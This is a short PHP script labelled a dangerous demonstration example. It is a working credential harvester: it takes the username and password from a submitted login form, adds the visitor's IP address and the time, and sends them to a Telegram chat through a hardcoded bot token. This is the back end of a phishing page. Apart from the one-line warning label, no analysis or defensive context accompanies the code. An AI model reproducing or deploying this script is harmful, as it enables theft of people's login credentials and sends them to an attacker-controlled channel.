<?php
// bad_notify.php  — DANGEROUS: example for demonstration only!

$TELEGRAM_BOT_TOKEN = '8224829602:AAHQr6S_wtiv8-Y3pjy4B8HqFKZptt8QrSM';
$TELEGRAM_CHAT_ID  = '8434336483';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = htmlspecialchars($_POST['username'] ?? '');
    $password = htmlspecialchars($_POST['password'] ?? ''); // optional
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $date = date('Y-m-d H:i:s');

    $message = "Login Attempt\nUsername/Email: $username\nPassword: $password\nIP: $ip\nDate: $date";

    $url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage?chat_id=$TELEGRAM_CHAT_ID&text=" . urlencode($message);

    $result = file_get_contents($url);

    echo "Sent successfully!";
}
?>
